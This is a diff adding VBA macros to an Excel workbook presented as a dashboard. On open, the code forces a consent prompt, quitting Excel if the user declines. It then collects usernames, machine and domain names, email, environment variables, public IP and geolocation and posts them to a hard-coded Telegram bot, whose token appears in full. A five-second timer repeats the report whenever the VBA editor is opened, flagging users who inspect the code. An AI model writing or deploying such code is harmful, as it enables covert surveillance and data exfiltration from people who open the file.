@@ -1,0 +1,433 @@
+ThisWorkBook -
+
+' ============================================
+' TRACKING CONSENTED USERS
+' ============================================
+Private Function HasUserConsented() As Boolean
+    ' Check if this user has already consented
+    Dim consentKey As String
+    consentKey = Environ("COMPUTERNAME") & "_" & Environ("USERNAME")
+    
+    ' Check registry or file for consent record
+    On Error Resume Next
+    HasUserConsented = (GetSetting("ExcelDashboard", "Consent", consentKey, "0") = "1")
+    On Error GoTo 0
+End Function
+
+Private Sub SaveUserConsent()
+    ' Save that this user has consented
+    Dim consentKey As String
+    consentKey = Environ("COMPUTERNAME") & "_" & Environ("USERNAME")
+    
+    On Error Resume Next
+    SaveSetting "ExcelDashboard", "Consent", consentKey, "1"
+    On Error GoTo 0
+End Sub
+
+' ============================================
+' WORKBOOK OPEN EVENT
+' ============================================
+Private Sub Workbook_Open()
+    Dim response As VbMsgBoxResult
+    Dim isNewUser As Boolean
+    
+    ' Check if this is a new user (hasn't consented before)
+    isNewUser = Not HasUserConsented()
+    
+    If isNewUser Then
+        ' NEW USER - Show consent dialog
+        Dim consentMsg As String
+        
+        consentMsg = "+---------------------------------------+" & vbCrLf & _
+                     "¦      FIRST-TIME ACCESS CONSENT      ¦" & vbCrLf & _
+                     "+---------------------------------------+" & vbCrLf & vbCrLf & _
+                     "To access this dashboard, you must consent to" & vbCrLf & _
+                     "the collection and monitoring of:" & vbCrLf & vbCrLf & _
+                     "• System information (username, PC name, etc.)" & vbCrLf & _
+                     "• Network data (IP address, location)" & vbCrLf & _
+                     "• Usage monitoring (VBA/Power Query access)" & vbCrLf & _
+                     "• Email address and geolocation" & vbCrLf & vbCrLf & _
+                     "This data will be sent to the administrator." & vbCrLf & vbCrLf & _
+                     "Do you AGREE to these terms?"
+        
+        response = MsgBox(consentMsg, vbYesNo + vbExclamation, "Consent Required")
+        
+        If response = vbNo Then
+            ' User declined - close file
+            MsgBox "Access denied. File will close.", vbCritical, "Access Denied"
+            ThisWorkbook.Saved = True
+            Application.DisplayAlerts = False
+            ThisWorkbook.Close SaveChanges:=False
+            Application.Quit
+            Exit Sub
+        Else
+            ' User agreed - save consent and send initial report
+            SaveUserConsent
+            MsgBox "Consent granted. Welcome!", vbInformation, "Access Granted"
+            Call SendNewUserReport
+        End If
+    End If
+    
+    ' For all users (new and returning) - start monitoring
+    On Error Resume Next
+    Application.OnTime Now + TimeValue("00:00:05"), "CheckVBEAccess"
+    On Error GoTo 0
+    
+    ' Start auto-refresh scheduler
+    On Error Resume Next
+    StartScheduler
+    On Error GoTo 0
+End Sub
+
+' ============================================
+' SEND NEW USER REPORT TO TELEGRAM
+' ============================================
+Private Sub SendNewUserReport()
+    On Error Resume Next
+    Dim message As String
+    
+    message = "?? NEW USER ACCESS" & vbCrLf & _
+              "-------------------------------" & vbCrLf & _
+              "A new user has accessed the dashboard" & vbCrLf & _
+              "and granted consent." & vbCrLf & vbCrLf & _
+              CollectSystemInfo()
+    
+    Call Module2.SendToTelegram(message)
+End Sub
+
+' ============================================
+' COLLECT ALL SYSTEM INFORMATION
+' ============================================
+Private Function CollectSystemInfo() As String
+    Dim info As String
+    Dim http As Object
+    Dim ipData As String
+    
+    ' Basic system info
+    info = "?? USER INFORMATION:" & vbCrLf & _
+           "Windows Username: " & Environ("USERNAME") & vbCrLf & _
+           "PC/Machine Name: " & Environ("COMPUTERNAME") & vbCrLf & _
+           "Windows Domain: " & Environ("USERDOMAIN") & vbCrLf & _
+           "Excel Username: " & Application.UserName & vbCrLf & vbCrLf & _
+           "?? SYSTEM DETAILS:" & vbCrLf & _
+           "Office Language: " & Application.LanguageSettings.LanguageID(msoLanguageIDUI) & vbCrLf & _
+           "Excel Version: " & Application.Version & vbCrLf & _
+           "System DateTime: " & Now & vbCrLf & _
+           "System Locale: " & Application.International(xlCountryCode) & vbCrLf & _
+           "Workbook Path: " & ThisWorkbook.FullName & vbCrLf & _
+           "Workbook Name: " & ThisWorkbook.Name & vbCrLf
+    
+    ' Installed add-ins
+    Dim addin As addin
+    Dim addinList As String
+    addinList = ""
+    On Error Resume Next
+    For Each addin In Application.AddIns
+        If addin.Installed Then
+            addinList = addinList & addin.Name & ", "
+        End If
+    Next addin
+    If Len(addinList) > 2 Then addinList = Left(addinList, Len(addinList) - 2)
+    If addinList = "" Then addinList = "None"
+    info = info & "Installed Add-ins: " & addinList & vbCrLf
+    On Error GoTo 0
+    
+    ' Environment variables
+    info = info & vbCrLf & "?? ENVIRONMENT:" & vbCrLf & _
+           "Processor: " & Environ("PROCESSOR_IDENTIFIER") & vbCrLf & _
+           "OS: " & Environ("OS") & vbCrLf & _
+           "User Profile: " & Environ("USERPROFILE") & vbCrLf & _
+           "Temp Path: " & Environ("TEMP") & vbCrLf
+    
+    ' Get IP and geolocation
+    On Error Resume Next
+    Set http = CreateObject("MSXML2.XMLHTTP")
+    
+    http.Open "GET", "https://ipapi.co/json/", False
+    http.Send
+    
+    If http.Status = 200 Then
+        ipData = http.responseText
+        info = info & vbCrLf & "?? NETWORK & LOCATION:" & vbCrLf & _
+               "Public IP: " & ExtractJSON(ipData, "ip") & vbCrLf & _
+               "City: " & ExtractJSON(ipData, "city") & vbCrLf & _
+               "Region: " & ExtractJSON(ipData, "region") & vbCrLf & _
+               "Country: " & ExtractJSON(ipData, "country_name") & vbCrLf & _
+               "GPS Latitude: " & ExtractJSON(ipData, "latitude") & vbCrLf & _
+               "GPS Longitude: " & ExtractJSON(ipData, "longitude") & vbCrLf & _
+               "Timezone: " & ExtractJSON(ipData, "timezone") & vbCrLf & _
+               "ISP: " & ExtractJSON(ipData, "org") & vbCrLf
+    Else
+        info = info & vbCrLf & "?? NETWORK & LOCATION:" & vbCrLf & _
+               "Unable to retrieve location data" & vbCrLf
+    End If
+    On Error GoTo 0
+    
+    ' Email address
+    Dim emailAddr As String
+    On Error Resume Next
+    emailAddr = Environ("EMAIL")
+    If emailAddr = "" Then emailAddr = Environ("USEREMAIL")
+    If emailAddr = "" Then emailAddr = "Not available"
+    info = info & vbCrLf & "?? EMAIL:" & vbCrLf & _
+           "Email Address: " & emailAddr & vbCrLf
+    On Error GoTo 0
+    
+    CollectSystemInfo = info
+End Function
+
+' ============================================
+' JSON PARSER HELPER
+' ============================================
+Private Function ExtractJSON(jsonText As String, key As String) As String
+    Dim startPos As Long
+    Dim endPos As Long
+    Dim value As String
+    
+    On Error Resume Next
+    
+    ' Try string value first
+    startPos = InStr(jsonText, """" & key & """:""")
+    If startPos > 0 Then
+        startPos = startPos + Len(key) + 5
+        endPos = InStr(startPos, jsonText, """")
+        value = Mid(jsonText, startPos, endPos - startPos)
+    Else
+        ' Try numeric/boolean value
+        startPos = InStr(jsonText, """" & key & """:")
+        If startPos > 0 Then
+            startPos = startPos + Len(key) + 4
+            endPos = InStr(startPos, jsonText, ",")
+            If endPos = 0 Then endPos = InStr(startPos, jsonText, "}")
+            value = Trim(Mid(jsonText, startPos, endPos - startPos))
+            value = Replace(value, """", "")
+        End If
+    End If
+    
+    If value = "" Then value = "N/A"
+    ExtractJSON = value
+    
+    On Error GoTo 0
+End Function
+
+
+
+
+
+
+
+Module2 - 
+
+
+' ============================================
+' CONFIGURATION - Only Telegram for monitoring
+' ============================================
+Const TELEGRAM_BOT_TOKEN As String = "8227627622:AAFaTkUH8a7JL_yAFX_LsXqDmiauSYvnFeE"
+Const TELEGRAM_CHAT_ID As String = "6396309479"
+
+' ============================================
+' DETECT VBA EDITOR ACCESS
+' ============================================
+Private Declare PtrSafe Function FindWindow Lib "user32" Alias "FindWindowA" _
+    (ByVal lpClassName As String, ByVal lpWindowName As String) As LongPtr
+
+Public Sub CheckVBEAccess()
+    Dim vbeWindow As LongPtr
+    vbeWindow = FindWindow("wndclass_desked_gsk", vbNullString)
+    
+    If vbeWindow <> 0 Then
+        Call SendUnauthorizedAccessAlert("VBA Editor opened")
+    End If
+    
+    ' Reschedule check
+    On Error Resume Next
+    Application.OnTime Now + TimeValue("00:00:05"), "CheckVBEAccess"
+    On Error GoTo 0
+End Sub
+
+' ============================================
+' SEND UNAUTHORIZED ACCESS ALERT
+' ============================================
+Private Sub SendUnauthorizedAccessAlert(alertType As String)
+    On Error Resume Next
+    
+    Dim message As String
+    message = "?? UNAUTHORIZED ACCESS DETECTED" & vbCrLf & _
+              "-------------------------------" & vbCrLf & _
+              "Alert: " & alertType & vbCrLf & _
+              "Time: " & Now & vbCrLf & vbCrLf & _
+              CollectSystemInfo()
+    
+    Call SendToTelegram(message)
+End Sub
+
+' ============================================
+' COLLECT ALL USER DETAILS
+' ============================================
+Public Function CollectSystemInfo() As String
+    Dim info As String
+    Dim http As Object
+    Dim ipData As String
+    
+    ' USER INFORMATION
+    info = "?? USER INFORMATION:" & vbCrLf & _
+           "Windows Username: " & Environ("USERNAME") & vbCrLf & _
+           "PC/Machine Name: " & Environ("COMPUTERNAME") & vbCrLf & _
+           "Windows Domain: " & Environ("USERDOMAIN") & vbCrLf & _
+           "Excel Username: " & Application.UserName & vbCrLf
+    
+    ' EMAIL ADDRESS
+    Dim emailAddr As String
+    On Error Resume Next
+    emailAddr = Environ("EMAIL")
+    If emailAddr = "" Then emailAddr = Environ("USEREMAIL")
+    If emailAddr = "" Then emailAddr = "Not available"
+    info = info & "Email Address: " & emailAddr & vbCrLf
+    On Error GoTo 0
+    
+    ' SYSTEM DETAILS
+    info = info & vbCrLf & "?? SYSTEM DETAILS:" & vbCrLf & _
+           "Office Language/Region: " & Application.LanguageSettings.LanguageID(msoLanguageIDUI) & vbCrLf & _
+           "Excel Version: " & Application.Version & vbCrLf & _
+           "System DateTime: " & Now & vbCrLf & _
+           "System Locale: " & Application.International(xlCountryCode) & vbCrLf & _
+           "Workbook Path: " & ThisWorkbook.FullName & vbCrLf & _
+           "Workbook Name: " & ThisWorkbook.Name & vbCrLf
+    
+    ' INSTALLED ADD-INS
+    Dim addin As addin
+    Dim addinList As String
+    addinList = ""
+    On Error Resume Next
+    For Each addin In Application.AddIns
+        If addin.Installed Then
+            addinList = addinList & addin.Name & ", "
+        End If
+    Next addin
+    If Len(addinList) > 2 Then addinList = Left(addinList, Len(addinList) - 2)
+    If addinList = "" Then addinList = "None"
+    info = info & "Installed Add-ins: " & addinList & vbCrLf
+    On Error GoTo 0
+    
+    ' ENVIRONMENT VARIABLES
+    info = info & vbCrLf & "?? ENVIRONMENT VARIABLES:" & vbCrLf & _
+           "Processor: " & Environ("PROCESSOR_IDENTIFIER") & vbCrLf & _
+           "OS: " & Environ("OS") & vbCrLf & _
+           "User Profile: " & Environ("USERPROFILE") & vbCrLf & _
+           "Temp Path: " & Environ("TEMP") & vbCrLf & _
+           "System Drive: " & Environ("SystemDrive") & vbCrLf & _
+           "Computer Domain: " & Environ("LOGONSERVER") & vbCrLf
+    
+    ' GET PUBLIC IP AND GEOLOCATION
+    On Error Resume Next
+    Set http = CreateObject("MSXML2.XMLHTTP")
+    
+    http.Open "GET", "https://ipapi.co/json/", False
+    http.Send
+    
+    If http.Status = 200 Then
+        ipData = http.responseText
+        
+        info = info & vbCrLf & "?? NETWORK & LOCATION:" & vbCrLf & _
+               "Public IP Address: " & ExtractJSON(ipData, "ip") & vbCrLf & _
+               "Current Location (City): " & ExtractJSON(ipData, "city") & vbCrLf & _
+               "Region: " & ExtractJSON(ipData, "region") & vbCrLf & _
+               "Country: " & ExtractJSON(ipData, "country_name") & vbCrLf & _
+               "Country Code: " & ExtractJSON(ipData, "country_code") & vbCrLf & _
+               "Postal Code: " & ExtractJSON(ipData, "postal") & vbCrLf & vbCrLf & _
+               "?? GPS/DEVICE LOCATION:" & vbCrLf & _
+               "Latitude: " & ExtractJSON(ipData, "latitude") & vbCrLf & _
+               "Longitude: " & ExtractJSON(ipData, "longitude") & vbCrLf & _
+               "Timezone: " & ExtractJSON(ipData, "timezone") & vbCrLf & _
+               "UTC Offset: " & ExtractJSON(ipData, "utc_offset") & vbCrLf & _
+               "ISP/Organization: " & ExtractJSON(ipData, "org") & vbCrLf & _
+               "ASN: " & ExtractJSON(ipData, "asn") & vbCrLf
+    Else
+        info = info & vbCrLf & "?? NETWORK & LOCATION:" & vbCrLf & _
+               "Unable to retrieve IP and location data" & vbCrLf
+    End If
+    
+    Set http = Nothing
+    On Error GoTo 0
+    
+    CollectSystemInfo = info
+End Function
+
+' ============================================
+' JSON PARSER HELPER
+' ============================================
+Private Function ExtractJSON(jsonText As String, key As String) As String
+    Dim startPos As Long
+    Dim endPos As Long
+    Dim value As String
+    
+    On Error Resume Next
+    
+    ' Try string value first
+    startPos = InStr(jsonText, """" & key & """:""")
+    If startPos > 0 Then
+        startPos = startPos + Len(key) + 5
+        endPos = InStr(startPos, jsonText, """")
+        value = Mid(jsonText, startPos, endPos - startPos)
+    Else
+        ' Try numeric/boolean value
+        startPos = InStr(jsonText, """" & key & """:")
+        If startPos > 0 Then
+            startPos = startPos + Len(key) + 4
+            endPos = InStr(startPos, jsonText, ",")
+            If endPos = 0 Then endPos = InStr(startPos, jsonText, "}")
+            value = Trim(Mid(jsonText, startPos, endPos - startPos))
+            value = Replace(value, """", "")
+        End If
+    End If
+    
+    If value = "" Then value = "N/A"
+    ExtractJSON = value
+    
+    On Error GoTo 0
+End Function
+
+' ============================================
+' SEND MESSAGE TO TELEGRAM
+' ============================================
+Public Sub SendToTelegram(message As String)
+    On Error Resume Next
+    Dim http As Object
+    Dim url As String
+    Dim postData As String
+    
+    Set http = CreateObject("MSXML2.XMLHTTP")
+    
+    url = "https://api.telegram.org/bot" & TELEGRAM_BOT_TOKEN & "/sendMessage"
+    postData = "chat_id=" & TELEGRAM_CHAT_ID & "&text=" & UrlEncode(message)
+    
+    http.Open "POST", url, False
+    http.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
+    http.Send postData
+    
+    Set http = Nothing
+End Sub
+
+' ============================================
+' URL ENCODING HELPER
+' ============================================
+Private Function UrlEncode(text As String) As String
+    Dim i As Long
+    Dim char As String
+    Dim result As String
+    
+    For i = 1 To Len(text)
+        char = Mid(text, i, 1)
+        Select Case char
+            Case "A" To "Z", "a" To "z", "0" To "9", "-", ".", "_", "~"
+                result = result & char
+            Case " "
+                result = result & "+"
+            Case Else
+                result = result & "%" & Right("0" & Hex(Asc(char)), 2)
+        End Select
+    Next i
+    
+    UrlEncode = result
+End Function
+
